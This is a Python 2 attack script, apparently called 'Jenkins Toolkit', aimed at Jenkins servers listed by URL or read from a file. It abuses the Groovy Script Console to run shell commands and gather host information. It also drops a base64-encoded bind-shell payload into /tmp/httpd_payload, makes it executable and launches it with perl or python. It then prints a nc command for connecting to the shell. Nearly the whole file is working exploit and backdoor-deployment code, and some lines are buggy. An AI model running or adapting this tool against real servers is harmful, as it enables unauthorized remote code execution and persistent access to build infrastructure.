import requests
import argparse
import urllib 
import urllib2
import os.path
import sys
import base64
from urlparse import urlparse
from colorama import init
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup

def SendGroovyScriptScript(url,crumb,groovyscript):
    "Sends any Groovy Script to the given Jenskins Host via ScripConsole"

    scriptresult=None

    try:
        
        headers = {

        'UserAgent':'Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0',
        'ContentType':'application/x-www-form-urlencoded',
        'Method':'POST'
        }
        
        if not crumb==None:
            crumbkey=crumb.split(':')[0]
            crumbvalue=crumb.split(':')[1]
            
            data = {
                'script': groovyscript,
                'Submit': 'Run',
                crumbkey:crumbvalue
            }
        else:
            data = {
                'script': groovyscript,
                'Submit': 'Run'
        }
            
            
        data = urllib.urlencode(data)
        
        if args.verbose:
            print "Sending Payload to Jenkins Host {0}".format(url)
            print

        req = urllib2.Request(url, data,headers)
        response = urllib2.urlopen(req, timeout=10)
        the_page = response.read()

        soup=BeautifulSoup(the_page,'html.parser')

        scriptresult = str(soup.find_all('pre')[1]).replace("<pre>","")
        scriptresult = scriptresult.replace("</pre>","")

        if args.verbose:
            print scriptresult

    except urllib2.HTTPError as err:
         print(Fore.RED + err.reason)
         result=False
    except:
        result=False
        print(Fore.RED + "Oops - Error Sending GroovyScript to Jenkins Host {0}".format(url))
        print("Unexpected error:", sys.exc_info()[0])
        print(Style.RESET_ALL)

    return scriptresult

def ConvertShell2GroovyScript(script,waitforexit=True):
    "Converts a Shell Command/Script into GroovyScript"
    
    groovy_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
    
    script_command_counter=0
    
    for line in script.splitlines():   
           
        groovy_script +='def proc{0} = """{1}""".execute()\n'.format(script_command_counter,line)

        if waitforexit==True:
            groovy_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(script_command_counter)
            groovy_script +='proc{0}.waitForOrKill(1000)\n'.format(script_command_counter)

        script_command_counter+=1
           
    groovy_script += 'println "$sout"'

    return groovy_script

def GetJenkinsCrumb(url):

    crumb=None

    try:

        url=url.replace("/script","")
        req = urllib2.Request(url+'/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)')
        response = urllib2.urlopen(req, timeout=10)
        the_page = response.read()
        crumb = the_page.strip()
    except:
        if args.verbose:
            print "Failed to get Jenkins Crumb"

    return crumb

def GenerateGroovyLinuxPayload(payload):
    "Generates the GroovyScript Shell Payload for Linux Systems"

    payload_script="def sout = new StringBuffer(), serr = new StringBuffer()\n"
    payload_script='def encoded = "{0}"\n'.format(payload)
    payload_script +='byte[] decoded = encoded.decodeBase64()\n'
    payload_script +='def s = new String(decoded)\n'
    payload_script +='new File("/tmp/","httpd_payload").withWriter{ it << s }\n'

    payload_script +='def proc{0} = """{1}""".execute()\n'.format(0,'chmod +x /tmp/httpd_payload')
    payload_script +='proc{0}.consumeProcessOutput(sout, serr)\n'.format(0)
    payload_script +='proc{0}.waitForOrKill(1000)\n'.format(0)

    return payload_script


def GetJenkinsSystemType(url,crumb):

      result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript('wmic os get Caption /value'))

      if not result.find('Windows')==-1:
          return "windows"
      else:
          return "linux"

def WriteJenkinsInfo(url,text,file):

    try:
        with open(file, 'a') as f:
            f.write("######## Host:{0} #########\n".format(url))
            f.write("\n")
            f.write(text)
            f.write("\n")
            f.write("##########################################################\n")
            f.write("\n")
            f.closed
        True
    except:
         print "Failed to write Info Output"

parser = argparse.ArgumentParser(description='Jenkins Toolkit')

parser.add_argument('-u','--url', nargs='+', help='<Required> One or more Jenkins Urls to process. You can also specifiy a text file with the urls in it', required=True, type=str)
parser.add_argument("-m", "--mode", type=str, choices=['info','shell'], help='<Required> Specifies the Toolkit Mode')
parser.add_argument('-o','--output', help='<Optional> File where the output is written (Only if Mode = Info)', type=str, default=None)
parser.add_argument('-spw','--shellpassword', help='<Optional> Password for Shell', type=str, default='none')
parser.add_argument('-sp','--shellport', help='<Required (Mode Shell)> Port Bind Shell', type=int, default=0)
parser.add_argument("-st", "--shelltype", type=str, choices=['perl','python'], help='<Optional (Mode Shell)> Specifies Shell Script Type - Default:"perl"', default="perl")
parser.add_argument("-v", "--verbose", help="Show Debug Information",action="store_true")
args = parser.parse_args()

init()

print "Jenkins Toolkit started"
print

print "Parsing URL List..."

url_list=[]
dir_path = os.path.dirname(os.path.realpath(__file__))

for url_arg in args.url:
    
    if os.path.isfile(url_arg):
         if not os.path.exists(url_arg):
             raise Exception("The file %s does not exist!" % url_arg)
         else:
             with open(url_arg, 'r') as f:
                txtarray=str(f.read()).splitlines()
                f.closed
                for txturl in txtarray:
                    url_list.append(txturl)
             True
    else:
        url_list.append(url_arg)


print(Fore.GREEN + "{0} URL's added".format(len(url_list)))
print(Style.RESET_ALL)

print "Importing Scripts...."

if args.mode == 'info':
    
    info_script_path = os.path.join(dir_path,'cmds','jenkins_info_linux')

    if args.verbose:
        print "Importing Jenkins Info Script (Linux) {0}".format(info_script_path)

    if not os.path.exists(info_script_path):
       raise Exception("The file %s does not exist!" % info_script_path)

    with open(info_script_path, 'r') as f:
        info_script_linux = f.read()
        f.closed
    True

    info_script_path = os.path.join(dir_path,'cmds','jenkins_info_windows')

    if args.verbose:
        print "Importing Jenkins Info Script (Windows) {0}".format(info_script_path)

    if not os.path.exists(info_script_path):
       raise Exception("The file %s does not exist!" % info_script_path)

    with open(info_script_path, 'r') as f:
        info_script_windows = f.read()
        f.closed
    True

    if args.verbose:
        print "Jenkins Info Script imported!"


if args.mode == 'shell':

    shell_script_path = os.path.join(dir_path,'cmds','jenkins_shell_linux')

    if args.verbose:
        print "Importing Jenkins Shell Script (Linux) {0}".format(shell_script_path)

    if not os.path.exists(shell_script_path):
       raise Exception("The file %s does not exist!" % shell_script_path)

    with open(shell_script_path, 'r') as f:
        shell_script_linux = f.read()
        f.closed
    True

    shell_script_linux=base64.b64encode(shell_script_linux)

    shell_script_path = os.path.join(dir_path,'cmds','jenkins_shell_windows')

    if args.verbose:
        print "Importing Jenkins Shell Script (Windows) {0}".format(shell_script_path)

    if not os.path.exists(shell_script_path):
       raise Exception("The file %s does not exist!" % shell_script_path)

    with open(shell_script_path, 'r') as f:
        shell_script_windows = f.read()
        f.closed
    True

    shell_script_windows=base64.b64encode(shell_script_windows)

    if args.verbose:
        print "Jenkins Shell Script imported!"
    
    if args.shellport == 0:
        raise Exception("Shell Port Number not set!")

print "Done - Scripts Imported"
print

for jenkinsurl in url_list:

    print "Analyzing {0} ".format(jenkinsurl)
    print
    
    if args.verbose:
        print "Trying to getting Jenkins Crumb..."
   
    crumb=GetJenkinsCrumb(jenkinsurl)

    if args.verbose:
        if not crumb==None:
            print(Fore.GREEN + "Successfull grepped Jenkins Crumb")
            print(Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "Failed to get Jenkins Grub - you may get false Results for this Host")
            print(Style.RESET_ALL)

    if args.verbose:
         print "Getting System Type of Host {0}".format(jenkinsurl)

    system_type=GetJenkinsSystemType(jenkinsurl,crumb)

    if args.verbose:
        print "Detected System Type:{0}".format(system_type)
         

    if args.mode == 'info':

        if system_type == "windows":      
            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(info_script_windows,True))
        else:
            result=SendGroovyScriptScript(jenkinsurl,crumb,ConvertShell2GroovyScript(info_script_linux,True))
       
        if not result==None:
          print(Fore.GREEN + "{0} successfull analyzed".format(jenkinsurl))
          print(Style.RESET_ALL)

          if not args.output==None:
              WriteJenkinsInfo(jenkinsurl,result,args.output)
          else:
               print result
        else:
          print(Fore.RED + "{0} failed!".format(jenkinsurl))
          print(Style.RESET_ALL)

          if not args.output==None:
              WriteJenkinsInfo(jenkinsurl,"{0} failed!".format(jenkinsurl),args.output)
          
    if args.mode == 'shell':

        urlparse=urlparse(jenkinsurl)

        if system_type=="windows":
            print(Fore.YELLOW + "Sorry...not yet implemented")

        else:

            payload_result=SendGroovyScriptScript(url,crumb,GenerateGroovyLinuxPayload(shell_script_linux))
            
            if payload_result:
                payload_result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript("{0} /tmp/httpd_payload".format(args.shelltype),False))
                if payload_result:
                    print(Fore.GREEN + "Shell successfully deployed on Host {0}".format(jenkinsurl))
                    print("Connect to Shell manual via: nc {0} {1} with Password {2}".format(urlparse.hostname,args.shellport,args.shellpassword))
                    print(Style.RESET_ALL)
                else:
                    print(Fore.RED + "Failed to execute Shell Payload on Host {0}".format(jenkinsurl))
                    print(Style.RESET_ALL)
            else:
                print(Fore.RED + "Failed to send Payload to {0}".format(jenkinsurl))
                print(Style.RESET_ALL)

